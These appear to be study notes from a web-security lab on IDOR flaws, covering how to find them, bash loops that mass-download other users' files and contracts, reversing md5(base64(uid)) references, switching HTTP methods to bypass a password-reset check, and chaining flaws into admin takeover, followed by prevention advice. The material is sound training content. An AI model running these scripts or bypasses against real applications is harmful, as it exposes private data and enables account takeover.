## 1- Intro to IDOR

IDOR (Insecure Direct Object Reference) happens when a web app exposes a direct reference (like `file_id=123`) that users can manipulate to access other users’ data due to weak or missing access control.

Most applications fail to implement proper backend access control, making it possible to guess IDs and access resources that should be restricted.
### What Makes IDOR a Vulnerability

- Direct object reference alone is not the issue
- The real problem is **weak or missing backend access control**
- If a user can access a restricted resource just by changing parameters, the app is vulnerable
- Many apps rely only on front-end restrictions, which are easy to bypass manually

#### Impact of IDOR

- Accessing private data (files, personal info, credit card data)
- Modifying or deleting other users’ data
- Full account takeover
- Privilege escalation by calling admin functions exposed in the frontend

---
## 2- Identifying IDORs
Finding IDORs starts by locating object references in requests (like `?uid=1` or `?file=1.pdf`) and testing whether changing them exposes other users’ data.

#### URL Parameters & APIs
Look for parameters in URLs, APIs, or cookies that reference objects.  
Increment or fuzz the values (e.g., `uid=2`, `file_2.pdf`).  
Any access to data that isn’t yours indicates an IDOR.

#### AJAX Calls
Front-end JavaScript may reveal hidden or unused API calls.  
Some functions (like admin actions) might not run for normal users but still exist in the code.  
```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```
If you can manually trigger these calls and they work, it’s an IDOR.

#### Understand Hashing/Encoding
Object references may be encoded (Base64) or hashed.  
```javascript
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```
try to identify the hashing algorithm being used (e.g., with hash identifier tools) and then hash the filename to see if it matches the used hash. Once we can calculate hashes for other files, we may try downloading them, which may reveal an IDOR vulnerability if we can download any files that do not belong to us.
#### Compare User Roles
Create multiple accounts to compare APIs, parameters, or object IDs.  
Try replaying one user’s API calls while logged in as another `User2.  
```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```
If the backend only checks for a valid session and not ownership, it’s an IDOR.


---
## 3- Mass IDOR Enumeration
Mass-exploit IDORs by finding insecure object references (e.g. `?uid=1` or predictable filenames) then automating access to many IDs/files.
#### Insecure Parameters
Predictable file names or GET params can reveal other users’ files. Check links and URL params in-page and in requests.
```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
# URL param example:
documents.php?uid=1
```
- Try incrementing/fuzzing (`?uid=2`, `Invoice_2_*.pdf`).
- Inspect source / element inspector to find link patterns.
#### Mass Enumeration 

Extract links then download them programmatically.
```bash
# get raw list of links
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"

# extract only /documents/*.pdf
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```
or we can automate the full downloading all docs for all the users (uid 1-10)
```bash
# brute-force range and download matches (example)
#!/bin/bash
url="http://SERVER_IP:PORT"
for i in {1..10}; do
  for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
    wget -q $url/$link
  done
done
```

---

## 4- Bypassing Encoded References

Sometimes apps hide object references by hashing/encoding them (e.g., MD5, Base64). Enumeration becomes harder but **still possible** if the encoding logic is guessable or exposed.

 **Example: Contract Download:**
Interception shows:
```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

- POST request to `download.php`
- Parameter is **md5 hash**, not cleartext
- Hash is likely derived from uid/filename/etc.
- Try hashing possible values manually (uid, username, filename, base64(uid), etc.).

```bash
echo -n 1 | md5sum # c4ca4238a0b923820dcc509a6f75849b -
```
If nothing matches → suspect **custom hash logic** → ==check JS/frontend (common dev mistake).==


####  Function Disclosure 
If hashing is done in **JavaScript**, attacker can fully replicate the hash logic.
Inspecting source shows:
```javascript
javascript:downloadContract('1')
```

Function:
```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

so the **custom hash logic** →:   `md5(base64(uid))`

Test:
```bash
echo -n 1 | base64 -w 0 | md5sum # c4ca4238a0b923820dcc509a6f75849b -
 #  -n 1 , -w 0 : avoid adding newlines to be able to calculate the hash without hashing newlines that would change the final  hash.
```

→ Produces the **exact hash** used in request.  
Hashing scheme successfully reversed → **IDOR becomes exploitable**.
####  Mass Enumeration (Encoded IDOR)

Generate md5(base64(uid)) for a uid range:
```bash
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```
Final automated exploit script:
```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```
Downloads all contracts for uid 1→10 (e.g., `contract_<hash>.pdf`).


---
## 5- IDOR in Insecure APIs
IDOR doesn’t only expose files — it can also affect **API function calls**, letting attackers perform actions as other users (update profiles, reset passwords, change roles, etc.). These are **IDOR Insecure Function Calls**.

 Two Types of IDOR:
- **Information Disclosure IDOR** → read unauthorized data
- **Insecure Function Call IDOR** → perform actions as another user
#### 2Identifying Insecure APIs 
The _Employee Manager_ app allows users to edit their profiles. The update is sent via a **PUT /profile/api.php/profile/1** request containing hidden parameters like `uid`, `uuid`, and **role** — all controllable client‑side.
![[Pasted image 20251124114247.png]]
```json
{
    "uid": 1,
    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
    "role": "employee",
    "full_name": "Amy Lindon",
    "email": "a_lindon@employees.htb",
    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
}
```

- The app stores privilege info (e.g., `role=employee`) **in a cookie** → insecure.
- Hidden parameters in JSON (`uid`, `uuid`, `role`) can potentially be manipulated.
####  Exploiting Insecure APIs
Different manipulation attempts were performed on the API.

**Attempts & Results**
- Changing **uid** → blocked with `uid mismatch`
- Changing endpoint to edit **another user** → `uuid mismatch`
- Creating users with **POST** → blocked: _admins only_
- Deleting users → same restriction
- Updating own **role** → fails with `Invalid role`
#### Testing for Information Disclosure
- GET Request Testing to Attempt to access other users’ details by calling `/profile/api.php/profile/<id>` using GET.  
-  Use Leaked Data  If details are leaked (uuid, uid, role), they can be used to bypass checks in function‑call IDOR attempts.
- 
---
## 6- Chaining IDOR Vulnerabilities 
Even when insecure API **function calls** seem protected, an API may still leak data through **GET requests**. Once sensitive data (like UUIDs) is exposed, attackers can chain multiple IDOR flaws to escalate impact.

#### Information Disclosure
Testing the API with a `GET` request using another user's `uid` returns full user details — confirming an **IDOR Information Disclosure** vulnerability.
Leaked Data Includes: `uid`  `uuid` `role` `full_name`, `email`, `about`

This leaked `uuid` is critical because it allows bypassing previous checks that blocked modifying other users' profiles


####  Modifying Other Users’ Details
Using the leaked `uuid`, attackers can send a valid `PUT` request to a user's profile endpoint and modify their details without errors.
**Possible Attacks:**  Change email → trigger password reset → fully take over the account , Inject XSS payloads in the `about` field , Modify sensitive information silently

 ***bypass Access Denied to modification:***
if we blocked from changing other users Details **Try Change the http method to another (POST,PUT,PATH)**:
```bash
POST /reset.php HTTP/1.1

uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=pass
```
**Access Denied** -> **change the Request Method to `GET`**
```bash
GET /reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=pass
```
==Password changed successfully==
#### Chaining Two IDOR Vulnerabilities
By enumerating more users via `GET` IDOR, attackers can discover accounts with higher privileges (e.g., `web_admin`).

**Steps to Escalate Privileges**
- Enumerate all users → discover admin role (`web_admin`)
- Modify attacker’s own profile using valid `uuid`
- Change own `role` to `web_admin`
![[Pasted image 20251124200235.png]]
- Role update succeeds → no backend validation
- Gain admin-level privileges
**Achieving Full Control** : After upgrading the role to `web_admin`, attackers can perform privileged actions. (Create new users, Delete existing users..)

---

## 7- IDOR Prevention
IDOR happens because the backend lacks proper access control. To prevent it, developers must implement **object-level access control** and **secure object references** instead of exposing predictable IDs.
#### Object-Level Access Control
A strong RBAC system must validate every request by checking whether the user’s role allows access to the requested object.  
Instead of trusting user-controlled data (cookies, hidden fields), the backend should map permissions using a **server-side session token**.

- RBAC Mapping — compare requester’s `uid` and role with the target object.  
-  Backend Validation — authorization must happen on the server, not in user input.

Example logic: allow read/write only if the user’s `uid` matches or role is `admin`.
```javascript
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```

#### Object Referencing
Avoid predictable IDs like `uid=1`. They make enumeration and IDOR trivial. Use **strong, unique, random identifiers** (e.g., UUIDv4) and map them internally to real objects.
example:
```php
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result);
echo "<a href='" . $row['url'] . "' target='_blank'></a>";
```
- Strong References — UUIDs or salted hashes instead of sequential IDs.  
- Backend Mapping — generate IDs server-side and store them in the database.
Even with strong references, IDOR can still exist if access control is broken—therefore referencing strengthens security _only after_ RBAC is implemented.
